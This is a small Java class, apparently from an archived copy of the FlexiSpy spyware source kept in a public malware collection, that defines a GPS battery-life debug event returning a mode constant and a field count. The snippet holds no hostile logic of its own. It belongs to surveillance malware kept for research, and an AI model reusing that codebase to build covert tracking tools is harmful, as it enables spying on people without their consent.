/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.phoenix.prot.event;

/**
 * @author tanakharn
 * @version 1.0
 * @created 01-Nov-2010 10:32:21 AM
 */
public class GpsBatteryLifeDebugEvent extends BatteryLifeDebugEvent {
	

	@Override
	public int getMode(){
		return DebugMode.GPS_BATTERY_LIFE;
	}

	@Override
	public int getFieldCount() {
		return 4;
	}
	
}